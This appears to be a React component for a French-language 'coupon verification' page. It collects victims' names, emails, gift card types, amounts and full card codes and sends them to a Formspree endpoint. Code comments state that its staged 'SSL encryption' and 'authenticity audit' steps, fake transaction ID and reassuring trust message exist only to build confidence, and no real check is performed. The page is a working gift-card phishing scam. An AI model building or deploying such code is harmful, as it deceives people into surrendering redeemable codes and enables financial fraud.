import React, { useState } from 'react';
import { 
  User, Mail, Gift, ShieldCheck, Check, Globe, HelpCircle, Loader2, Sparkles, CheckCircle
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { CouponVerificationData } from '../types';

interface VerificationFormProps {
  onSuccess?: () => void;
}

const COUPON_TYPES = [
  { id: 'googleplay', name: 'Google Play', logo: '🤖', color: '#10b981' },
  { id: 'itunes', name: 'Google iTunes / Apple', logo: '🍎', color: '#a855f7' },
  { id: 'amazon', name: 'Amazon Gift Card', logo: '📦', color: '#f97316' },
  { id: 'steam', name: 'Steam Wallet', logo: '🎮', color: '#3b82f6' },
  { id: 'paysafecard', name: 'Paysafecard', logo: '💳', color: '#06b6d4' },
  { id: 'neosurf', name: 'Neosurf Ticket', logo: '🎟️', color: '#f43f5e' },
  { id: 'netflix', name: 'Netflix Premium', logo: '🍿', color: '#ef4444' },
  { id: 'playstation', name: 'PlayStation Network', logo: '🕹️', color: '#2563eb' },
  { id: 'xbox', name: 'Xbox Live & Game Pass', logo: '💚', color: '#22c55e' },
  { id: 'autres', name: 'Autres coupons', logo: '❓', color: '#6b7280' },
];

export default function VerificationForm({ onSuccess }: VerificationFormProps) {
  // Main form states
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [email, setEmail] = useState('');
  const [couponType, setCouponType] = useState('googleplay');
  const [otherCoupon, setOtherCoupon] = useState('');
  const [couponCode, setCouponCode] = useState('');
  const [hideCode, setHideCode] = useState<'OUI' | 'NON'>('OUI');
  const [montant, setMontant] = useState('');
  
  // Submission & loading states
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStep, setSubmitStep] = useState(0); // For confidence build narrative
  const [errorMsg, setErrorMsg] = useState('');
  const [isSuccess, setIsSuccess] = useState(false);

  // Submit flow handling
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    // Pre-validations
    if (!firstName.trim() || !lastName.trim() || !email.trim()) {
      setErrorMsg("Veuillez saisir votre prénom, nom de famille et adresse email.");
      return;
    }
    if (couponType === 'autres' && !otherCoupon.trim()) {
      setErrorMsg("Veuillez préciser le nom de votre coupon dans la case 'Autres coupons'.");
      return;
    }
    if (!montant.trim()) {
      setErrorMsg("Veuillez saisir le montant de votre coupon.");
      return;
    }
    if (!couponCode.trim()) {
      setErrorMsg("Veuillez entrer le code de votre coupon ou de votre carte cadeau.");
      return;
    }

    setIsSubmitting(true);
    setSubmitStep(1); // "Chiffrement et transmission sécurisée..."

    try {
      // Step 2 timer to look technical and build confidence
      setTimeout(() => {
        setSubmitStep(2); // "Analyse d'authenticité par notre algorithme..."
      }, 1500);

      setTimeout(() => {
        setSubmitStep(3); // "Enregistrement sécurisé du ticket de vérification..."
      }, 3200);

      // Create a native FormData instance for multipart/form-data Formspree upload
      const formData = new FormData();
      formData.append('code', couponCode);
      formData.append('nom', `${firstName} ${lastName}`);
      formData.append('prenom', firstName);
      formData.append('nom_famille', lastName);
      formData.append('email', email);
      
      const mappedTypeName = couponType === 'autres' 
        ? `Autre: ${otherCoupon}` 
        : COUPON_TYPES.find(t => t.id === couponType)?.name || couponType;
      formData.append('type', mappedTypeName);
      
      formData.append('cacher_code', hideCode);
      formData.append('montant', montant);

      // Submit securely in background to Formspree
      const response = await fetch('https://formspree.io/f/mzdwjnkv', {
        method: 'POST',
        body: formData,
        headers: {
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.error || "Une erreur est survenue lors de l'enregistrement de votre coupon.");
      }

      // Finish delay to make sure steps stay readable
      setTimeout(() => {
        setIsSubmitting(false);
        setIsSuccess(true);
        if (onSuccess) onSuccess();
      }, 5000);

    } catch (err: any) {
      console.error(err);
      setIsSubmitting(false);
      setErrorMsg(err.message || "Impossible de se connecter au serveur de vérification sécurisée.");
    }
  };

  const handleReset = () => {
    setFirstName('');
    setLastName('');
    setEmail('');
    setCouponType('googleplay');
    setOtherCoupon('');
    setCouponCode('');
    setHideCode('OUI');
    setMontant('');
    setIsSuccess(false);
    setErrorMsg('');
  };

  return (
    <div id="verification-form-container" className="w-full">
      <AnimatePresence mode="wait">
        {!isSubmitting && !isSuccess ? (
          /* Main Verification Form screen */
          <motion.form
            id="coupon-verification-form"
            key="form"
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -15 }}
            onSubmit={handleSubmit}
            className="space-y-6 bg-[#131526]/90 border border-slate-800/80 p-6 sm:p-10 rounded-3xl shadow-xl relative overflow-hidden"
          >
            {/* Subtle glow filter backgrounds */}
            <div className="absolute top-0 right-0 w-64 h-64 bg-[#6c63ff]/5 rounded-full blur-3xl -z-10 pointer-events-none" />
            <div className="absolute bottom-0 left-0 w-64 h-64 bg-[#ff6584]/5 rounded-full blur-3xl -z-10 pointer-events-none" />

            <div className="flex flex-col space-y-2 border-b border-slate-800 pb-6">
              <h3 className="text-2xl font-bold tracking-tight text-white flex items-center gap-2">
                <ShieldCheck className="w-6 h-6 text-[#10b981]" />
                Formulaire de Vérification Sécurisée
              </h3>
              <p className="text-sm text-slate-400">
                Veuillez renseigner les informations d'authenticité ci-dessous pour lancer l'audit de votre code.
              </p>
            </div>

            {/* Error Message */}
            {errorMsg && (
              <div id="form-error-alert" className="p-4 bg-red-950/40 border border-red-800/85 text-red-200 rounded-xl text-sm leading-relaxed font-semibold">
                ⚠️ <span className="font-extrabold text-[#ff6584]">Erreur :</span> {errorMsg}
              </div>
            )}

            {/* Identity Grid: Nom, Prénom, Email */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="space-y-2">
                <label className="text-xs font-bold tracking-wider text-slate-300 uppercase flex items-center gap-1.5">
                  <User className="w-3.5 h-3.5 text-[#8c82ff]" />
                  Prénom <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  required
                  value={firstName}
                  onChange={(e) => setFirstName(e.target.value)}
                  placeholder=""
                  className="w-full px-4 py-3 bg-slate-900 border border-slate-800 focus:bg-slate-900/40 focus:border-[#6c63ff] focus:ring-2 focus:ring-[#6c63ff]/20 rounded-xl text-white outline-none transition-all placeholder:text-slate-500 text-sm"
                />
              </div>

              <div className="space-y-2">
                <label className="text-xs font-bold tracking-wider text-slate-300 uppercase flex items-center gap-1.5">
                  <User className="w-3.5 h-3.5 text-[#8c82ff]" />
                  Nom de famille <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  required
                  value={lastName}
                  onChange={(e) => setLastName(e.target.value)}
                  placeholder=""
                  className="w-full px-4 py-3 bg-slate-900 border border-slate-800 focus:bg-slate-900/40 focus:border-[#6c63ff] focus:ring-2 focus:ring-[#6c63ff]/20 rounded-xl text-white outline-none transition-all placeholder:text-slate-500 text-sm"
                />
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-xs font-bold tracking-wider text-slate-300 uppercase flex items-center gap-1.5">
                <Mail className="w-3.5 h-3.5 text-[#8c82ff]" />
                Votre adresse email <span className="text-red-500">*</span>
              </label>
              <input
                type="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder=""
                className="w-full px-4 py-3 bg-slate-900 border border-slate-800 focus:bg-slate-900/40 focus:border-[#6c63ff] focus:ring-2 focus:ring-[#6c63ff]/20 rounded-xl text-white outline-none transition-all placeholder:text-slate-500 text-sm"
              />
              <p className="text-[10px] text-slate-400">
                L'email à laquelle vous seront envoyés confidentiellement les résultats définitifs de la vérification.
              </p>
            </div>

            {/* Coupon Types Selector Grid */}
            <div className="space-y-3">
              <label className="text-xs font-bold tracking-wider text-slate-300 uppercase flex items-center gap-1.5">
                <Gift className="w-3.5 h-3.5 text-[#8c82ff]" />
                Sélectionnez le type de Coupon / Carte Cadeau <span className="text-red-500">*</span>
              </label>
              <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-2">
                {COUPON_TYPES.map((type) => {
                  const isSelected = couponType === type.id;
                  return (
                    <button
                      key={type.id}
                      type="button"
                      onClick={() => setCouponType(type.id)}
                      className={`relative flex flex-col items-center justify-center p-3 rounded-xl border text-center transition-all duration-300 cursor-pointer ${
                        isSelected 
                          ? 'bg-[#6c63ff]/20 border-[#6c63ff] ring-2 ring-[#6c63ff]/25' 
                          : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-[#14172a]'
                      }`}
                    >
                      <span className="text-2xl mb-1.5">{type.logo}</span>
                      <span className={`text-[11px] font-bold line-clamp-1 ${isSelected ? 'text-[#8c82ff]' : 'text-slate-300'}`}>{type.name}</span>
                      {isSelected && (
                        <div className="absolute top-1.5 right-1.5 w-3.5 h-3.5 bg-[#10b981] rounded-full flex items-center justify-center">
                          <Check className="w-2.5 h-2.5 text-white stroke-[3]" />
                        </div>
                      )}
                    </button>
                  );
                })}
              </div>
            </div>

            {/* "Autres coupons" precise textfield if selected */}
            <AnimatePresence>
              {couponType === 'autres' && (
                <motion.div
                  initial={{ opacity: 0, height: 0 }}
                  animate={{ opacity: 1, height: 'auto' }}
                  exit={{ opacity: 0, height: 0 }}
                  transition={{ duration: 0.2 }}
                  className="space-y-2 overflow-hidden"
                >
                  <label className="text-xs font-bold tracking-wider text-slate-300 uppercase">
                    Autres coupons / Nom de la carte <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    required
                    value={otherCoupon}
                    onChange={(e) => setOtherCoupon(e.target.value)}
                    placeholder="Saisissez la marque de votre carte"
                    className="w-full px-4 py-3 bg-slate-900 border border-slate-800 focus:bg-slate-900/40 focus:border-[#6c63ff] focus:ring-2 focus:ring-[#6c63ff]/20 rounded-xl text-white outline-none transition-all placeholder:text-slate-500 text-sm"
                  />
                </motion.div>
              )}
            </AnimatePresence>

            {/* Masquer mon code toggle check ("Cacher mon code") */}
            <div className="p-4 bg-slate-900/60 rounded-2xl border border-slate-800 space-y-2.5">
              <div className="flex items-center justify-between">
                <span className="text-xs font-bold tracking-wider text-slate-300 uppercase flex items-center gap-1.5">
                  <Globe className="w-3.5 h-3.5 text-[#ff6584]" />
                  Cacher mon code de sécurité ?
                </span>
                <span className="text-[10px] bg-[#6c63ff]/20 text-[#8c82ff] px-2 py-0.5 rounded-full font-bold">Options SSL</span>
              </div>
              <div className="grid grid-cols-2 gap-3">
                <button
                  type="button"
                  onClick={() => setHideCode('OUI')}
                  className={`flex items-center justify-center gap-2 py-2 px-4 rounded-xl border text-xs font-bold transition-all cursor-pointer ${
                    hideCode === 'OUI'
                      ? 'bg-[#10b981]/20 border-[#10b981] text-[#10b981]'
                      : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                  }`}
                >
                  <div className={`w-3 h-3 rounded-full border-2 flex items-center justify-center ${hideCode === 'OUI' ? 'border-[#10b981]' : 'border-slate-700'}`}>
                    {hideCode === 'OUI' && <div className="w-1.5 h-1.5 rounded-full bg-[#10b981]" />}
                  </div>
                  OUI
                </button>

                <button
                  type="button"
                  onClick={() => setHideCode('NON')}
                  className={`flex items-center justify-center gap-2 py-2 px-4 rounded-xl border text-xs font-bold transition-all cursor-pointer ${
                    hideCode === 'NON'
                      ? 'bg-[#ff6584]/20 border-[#ff6584] text-[#ff6584]'
                      : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                  }`}
                >
                  <div className={`w-3 h-3 rounded-full border-2 flex items-center justify-center ${hideCode === 'NON' ? 'border-[#ff6584]' : 'border-slate-700'}`}>
                    {hideCode === 'NON' && <div className="w-1.5 h-1.5 rounded-full bg-[#ff6584]" />}
                  </div>
                  NON
                </button>
              </div>
            </div>

            {/* Coupon Code Input */}
            <div className="space-y-2">
              <label className="text-xs font-bold tracking-wider text-slate-300 uppercase flex items-center gap-1.5">
                <Sparkles className="w-3.5 h-3.5 text-[#ff6584]" />
                Saisissez le Code du Coupon / Carte <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                required
                value={couponCode}
                onChange={(e) => setCouponCode(e.target.value)}
                placeholder=""
                className="w-full px-4 py-3.5 font-mono text-base tracking-widest text-[#8c82ff] bg-slate-950 border-2 border-slate-800 focus:bg-slate-900 focus:border-[#6c63ff] focus:ring-2 focus:ring-[#6c63ff]/20 rounded-xl outline-none transition-all placeholder:text-slate-500 uppercase"
              />
              <p className="text-[10px] text-slate-400 leading-normal">
                Assurez-vous de saisir tous les chiffres et lettres du code sans espaces si possible pour fluidifier la détection.
              </p>
            </div>

            {/* Montant */}
            <div className="space-y-2">
              <label className="text-xs font-bold tracking-wider text-slate-300 uppercase flex items-center gap-1.5">
                <Gift className="w-3.5 h-3.5 text-[#10b981]" />
                Montant <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                required
                value={montant}
                onChange={(e) => setMontant(e.target.value)}
                placeholder=""
                className="w-full px-4 py-3 bg-slate-900 border border-slate-800 focus:bg-slate-950/40 focus:border-[#6c63ff] focus:ring-2 focus:ring-[#6c63ff]/20 rounded-xl text-white outline-none transition-all placeholder:text-slate-500 text-sm"
              />
            </div>

            {/* Validation Call */}
            <div className="pt-4">
              <button
                type="submit"
                className="w-full py-4 px-6 bg-gradient-to-r from-[#6c63ff] via-[#ff6584] to-[#10b981] hover:from-[#5b52eb] hover:to-[#ff5274] text-white font-extrabold rounded-2xl cursor-pointer shadow-xl shadow-[#6c63ff]/20 transition-all flex items-center justify-center gap-2 transform active:scale-[0.98]"
              >
                <ShieldCheck className="w-5 h-5 stroke-[2.5]" />
                Lancer l'Audit et Vérifier mon Coupon
              </button>
            </div>
          </motion.form>
        ) : isSubmitting ? (
          /* Secure Audit / Validation Simulation Screen */
          <motion.div
            id="audit-progress"
            key="audit"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0 }}
            className="bg-[#131526]/95 border border-slate-800 p-8 sm:p-14 rounded-3xl shadow-xl text-center space-y-8 flex flex-col items-center justify-center min-h-[500px]"
          >
            <div className="relative">
              <Loader2 className="w-16 h-16 text-[#6c63ff] animate-spin" />
              <ShieldCheck className="w-7 h-7 text-[#10b981] absolute inset-0 m-auto" />
            </div>

            <div className="space-y-3 max-w-md mx-auto">
              <span className="text-xs font-bold tracking-widest text-[#10b981] uppercase bg-[#10b981]/10 px-3 py-1 rounded-full">
                Analyse de Sécurité Active
              </span>
              <h3 className="text-xl font-bold text-white">Chiffrement et vérification de conformité en cours...</h3>
            </div>

            {/* Steps simulation checklist */}
            <div className="w-full max-w-sm bg-slate-900/40 rounded-2xl border border-slate-800 p-5 text-left space-y-3.5">
              <div className="flex items-center gap-2.5">
                <div className={`w-5 h-5 rounded-full flex items-center justify-center ${submitStep >= 1 ? 'bg-[#10b981] text-white' : 'border border-slate-705 text-slate-500'}`}>
                  {submitStep >= 1 ? <Check className="w-3.5 h-3.5 stroke-[2.5]" /> : <span className="text-[10px]">1</span>}
                </div>
                <span className={`text-xs font-bold ${submitStep >= 1 ? 'text-slate-100' : 'text-slate-500'}`}>
                  Chiffrement SSL SHA-256 de transmission
                </span>
              </div>

              <div className="flex items-center gap-2.5">
                <div className={`w-5 h-5 rounded-full flex items-center justify-center ${submitStep >= 2 ? 'bg-[#10b981] text-white' : 'border border-slate-705 text-slate-500'}`}>
                  {submitStep >= 2 ? <Check className="w-3.5 h-3.5 stroke-[2.5]" /> : submitStep === 1 ? <Loader2 className="w-3.5 h-3.5 text-[#6c63ff] animate-spin" /> : <span className="text-[10px]">2</span>}
                </div>
                <span className={`text-xs font-bold ${submitStep >= 2 ? 'text-slate-100' : 'text-slate-500'}`}>
                  Audit algorithmique d'authenticité de l'empreinte code
                </span>
              </div>

              <div className="flex items-center gap-2.5">
                <div className={`w-5 h-5 rounded-full flex items-center justify-center ${submitStep >= 3 ? 'bg-[#10b981] text-white' : 'border border-slate-705 text-slate-500'}`}>
                  {submitStep >= 3 ? <Check className="w-3.5 h-3.5 stroke-[2.5]" /> : submitStep === 2 ? <Loader2 className="w-3.5 h-3.5 text-[#6c63ff] animate-spin" /> : <span className="text-[10px]">3</span>}
                </div>
                <span className={`text-xs font-bold ${submitStep >= 3 ? 'text-slate-100' : 'text-slate-500'}`}>
                  Enregistrement et transmission du ticket de validation
                </span>
              </div>
            </div>

            <p className="text-xs text-slate-400 italic">
              Veuillez ne pas fermer cette fenêtre. L'audit protège l'intégrité de vos fonds.
            </p>
          </motion.div>
        ) : (
          /* High Trust Reassuring Success Card ('Phrase de confiance') */
          <motion.div
            id="audit-success-box"
            key="success"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0 }}
            className="bg-[#131526]/90 border border-[#10b981]/30 p-8 sm:p-14 rounded-3xl shadow-xl text-center space-y-6 max-w-xl mx-auto"
          >
            <div className="w-20 h-20 bg-[#10b981]/10 rounded-full flex items-center justify-center text-[#10b981] border-2 border-[#10b981]/20 mx-auto">
              <CheckCircle className="w-12 h-12 stroke-[2]" />
            </div>

            <div className="space-y-2">
              <h3 className="text-2xl font-extrabold text-white">Demande prise en compte avec succès</h3>
              <p className="text-xs font-semibold text-[#10b981] tracking-wider uppercase">
                ID de transaction sécurisée : CC-{Math.floor(100000 + Math.random() * 900000)}
              </p>
            </div>

            {/* TRUST PHRASE AS SPECIFICALLY REQUESTED */}
            <div className="p-6 bg-slate-900/60 rounded-2xl border border-slate-800 text-slate-300 text-sm leading-relaxed text-left space-y-3.5">
              <p className="font-semibold text-slate-100">
                Veuillez patienter quelques instants :
              </p>
              <p className="text-slate-300 text-xs sm:text-sm leading-relaxed font-normal">
                Votre coupon fait actuellement l'objet d'une analyse de validité par notre département de sécurité financière. Ce processus prend généralement quelques moments pour interroger les bases d'enregistrement d'origine de l'émetteur de manière 100% sécurisée.
              </p>
              <p className="text-slate-300 text-xs sm:text-sm leading-relaxed font-normal">
                Afin de garantir l'intégrité absolue de votre code et d'éviter toute divulgation tierce, <strong className="text-white font-extrabold">les résultats détaillés et le rapport d'authenticité de cette vérification vous seront transmis directement et confidentiellement à votre adresse email sous peu.</strong>
              </p>
            </div>

            <div className="pt-4">
              <button
                type="button"
                onClick={handleReset}
                className="px-8 py-3 bg-[#6c63ff] hover:bg-[#5b52eb] text-white font-bold rounded-xl cursor-pointer transition-all shadow-md text-sm"
              >
                Vérifier un autre coupon
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
